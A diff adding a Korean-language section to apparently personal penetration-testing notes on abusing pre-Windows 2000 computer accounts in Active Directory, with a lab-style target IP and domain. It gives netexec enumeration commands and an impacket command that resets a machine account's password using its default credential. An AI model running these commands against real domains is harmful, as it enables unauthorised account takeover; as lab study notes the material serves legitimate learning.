@@ -1,4 +1,27 @@
 <details>
+  <summary><strong>pre2K</strong></summary>
+
+- Windows 2000 이전 시스템과의 호환성을 위해 만든 정책
+- 당시 오래된 클라이언트들이 Kerberos를 못 쓰는 경우를 위한 레거시 옵션
+- https://www.hackingarticles.in/pre2k-active-directory-misconfigurations/
+
+### Enumeration
+```bash
+nxc ldap 10.129.234.44 -u trainee -p trainee -M pre2k
+```
+
+### Abusing
+```bash
+# STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT
+nxc smb 10.129.234.44 -u banking$ -p banking
+
+impacket-changepasswd -p rpc-samr -newpass 'Summer2026!' retro.vl/'banking$':banking@10.129.234.44
+```
+  
+</details>
+
+---
+<details>
   <summary><strong>signing</strong></summary>
 
 - `signing:True` : NTLM relay attack 불가.
